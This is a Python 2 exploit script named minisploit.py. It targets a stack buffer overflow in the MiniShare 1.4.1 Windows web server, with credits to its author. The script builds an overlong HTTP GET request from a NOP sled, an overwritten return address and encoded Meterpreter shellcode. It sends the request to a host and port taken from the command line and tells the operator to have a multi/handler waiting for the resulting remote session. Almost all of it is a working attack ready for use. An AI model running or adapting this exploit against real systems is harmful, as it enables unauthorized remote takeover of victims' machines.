#!/usr/bin/env python
'''
------------------------------------------------------------------------
********documentation*********
------------------------------------------------------------------------
what it is:
-----------	
This is a simple stack based buffer over flow exploit. I wrote this one using the
guides from lupin's blog http://grey-corner.blogspot.com
then decided to go a step a head and take options from the command line
as well use a meterpreter payload.
It exploits a vulnerability in a Windows application MiniShare 1.4.1. 
which is an older version of the MiniShare application   
-------------------------------------------------------------------------
test platiform:
--------------
Finally I tested this on windows xp sp2
Thats all there is to the documentation!
------------------------------------------------------------------------
*********code by************
------------------------------------------------------------------------
daniel maluki a.k.a ch!m3ra:  http://www.chimera40.wordpress.com
email:gillet5440@gmail.com
########################################################################
'''
import getopt 
import sys
import time
import socket
from socket import *
#create a  socket and send an exploit data over the network given the IP address 
#and the port as command line option
#some global sort of varables here
remote_port="80"
remote_address=""
#a define some colors in a class just to be flushy
class color:
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PINK = '\033[96m'
    DEFAULT_COLOR = '\033[0m'
#End of color class
#about function
def about():
    print color.DEFAULT_COLOR
    print color.BLUE +"\t###################################################################"
    print color.BLUE +"\t#"+ color.RED +"============++++++"+color.GREEN +" minisploit.py ver 0.1 "+color.RED +"++++++++++=============="+color.RED +"#"
    color.DEFAULT_COLOR
    print color.BLUE +"\t#"+ color.PINK +"--------by ch!m3ra: http://www.chimera40.wordpress.com-----------"+color.BLUE +"#"
    print color.BLUE +"\t#"+ color.PINK +"=============++++++++++++++++++++++++++++++++++++++=============="+color.BLUE +"#"
    print color.BLUE +"\t###################################################################"
    print color.DEFAULT_COLOR
#usage function
def usage ():
    print"Usage:./minisploit.py <options>"
    print"./minisploit.py -t <host> -p <port> "
    print"               -t          The remote host to exploit"
    print"               -p          The remote port (Default is 80)"
    print"               -h          Simply print this help menu and exit for "
    print"                Example:./sendsploit.py -h 192.168.56.101 -p 80 "
    print"                 (this will exploit minishare server at 192.168.56.101 )" 
    print"                or ./minisploit.py -h for help"
    print"                please make sure you start multi handler(meterpreter)"
#get option from the user
if __name__=='__main__':
    if len(sys.argv)<3:
        color.DEFAULT_COLOR
        print color.PURPLE +"you need at least one arguments"
        color.DEFAULT_COLOR
        about()
        usage()
        sys.exit(0)
    try:
        opts,args=getopt.getopt(sys.argv[1:], 't:p:,h')
    except getopt.GetoptError, e:
        print e
        usage()
        sys.exit(0)
    try:
        for option,argument in opts:
            if option=='-t':
                address=argument
                remote_address=address
            elif option=='-p':
                port=argument
                remote_port=port
            elif option=='-h':
                usage()
                sys.exit(0)
    except:
        exit(0) 
if int(remote_port)<=0 or remote_address=="":
    usage()
    sys.exit(0)
#if all is well we go on    
def print_answer():
    about()
    print color.PINK +"\n[+]Trying your payload on",remote_address," Port",remote_port,"Please Wait......"
    time.sleep(3)
    send_data()
def send_data():
#get the exploit (buggy data) into a good string
    buffer="GET "
    buffer+="\x90"*1787
    buffer+="\x65\x82\xA5\x7C"
    #my EIP value
    buffer+="\x90"*16
    #meterpreter payload
    buffer+=("\xba\x99\x89\xfd\xdd\xd9\xec\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
    "\x49\x83\xe8\xfc\x31\x50\x10\x03\x50\x10\x7b\x7c\x01\x35\xf2"
    "\x7f\xfa\xc6\x64\x09\x1f\xf7\xb6\x6d\x6b\xaa\x06\xe5\x39\x47"
    "\xed\xab\xa9\xdc\x83\x63\xdd\x55\x29\x52\xd0\x66\x9c\x5a\xbe"
    "\xa5\xbf\x26\xbd\xf9\x1f\x16\x0e\x0c\x5e\x5f\x73\xff\x32\x08"
    "\xff\x52\xa2\x3d\xbd\x6e\xc3\x91\xc9\xcf\xbb\x94\x0e\xbb\x71"
    "\x96\x5e\x14\x0e\xd0\x46\x1e\x48\xc1\x77\xf3\x8b\x3d\x31\x78"
    "\x7f\xb5\xc0\xa8\x4e\x36\xf3\x94\x1c\x09\x3b\x19\x5d\x4d\xfc"
    "\xc2\x28\xa5\xfe\x7f\x2a\x7e\x7c\xa4\xbf\x63\x26\x2f\x67\x40"
    "\xd6\xfc\xf1\x03\xd4\x49\x76\x4b\xf9\x4c\x5b\xe7\x05\xc4\x5a"
    "\x28\x8c\x9e\x78\xec\xd4\x45\xe1\xb5\xb0\x28\x1e\xa5\x1d\x94"
    "\xba\xad\x8c\xc1\xbc\xef\xd8\x26\xf2\x0f\x19\x21\x85\x7c\x2b"
    "\xee\x3d\xeb\x07\x67\x9b\xec\x68\x52\x5b\x62\x97\x5d\x9b\xaa"
    "\x5c\x09\xcb\xc4\x75\x32\x80\x14\x79\xe7\x06\x45\xd5\x58\xe6"
    "\x35\x95\x08\x8e\x5f\x1a\x76\xae\x5f\xf0\x1f\x44\xa5\x93\xdf"
    "\x30\x9d\x62\x88\x42\xde\x75\x14\xcb\x38\x1f\xb4\x9d\x93\x88"
    "\x2d\x84\x68\x28\xb1\x13\x15\x6a\x39\x97\xe9\x25\xca\xd2\xf9"
    "\xd2\x3a\xa9\xa0\x75\x44\x04\xce\x79\xd0\xa2\x59\x2d\x4c\xa8"
    "\xbc\x19\xd3\x53\xeb\x11\xda\xc1\x54\x4e\x23\x05\x55\x8e\x75"
    "\x4f\x55\xe6\x21\x2b\x06\x13\x2e\xe6\x3a\x88\xbb\x08\x6b\x7c"
    "\x6b\x60\x91\x5b\x5b\x2f\x6a\x8e\x5d\x0c\xbd\xf7\xdb\x64\xcb"
    "\x1b\x20")
    buffer+=" HTTP/1.1\r\n\r\n"
    
#first open the file given and put the data in into a list
    try:
        my_socket=socket(AF_INET,SOCK_STREAM)
	print color.BLUE +"[+]Connecting to ",remote_address, "........"
        my_socket.connect((remote_address,int(remote_port)))
	time.sleep(3)
	print "[+]Connection successful!"
	print "[+]Delivering your payload be patient......"
	time.sleep(3)
        my_socket.send(buffer)
	time.sleep(3)
	print color.GREEN +"[+]Done!"
        print color.BLUE +"[+]Your exploit data has been send to",remote_address,"Check you handler happy? :)"
        #close my sweet socket
        my_socket.close()
    except:
        print color.RED + "\nSploit FAILED ! check out that the remote host is really interested,ready or both :("
        print "Check out the kind of IP you gave coz if it's gabagge then........well its not being checked!"
	print my_socket.recv(1024)
print_answer()
#END
''' update through svn
well you can get the latest copy at http://code.google.com/chimeraproject/p/mini_sploit.py
'''
   
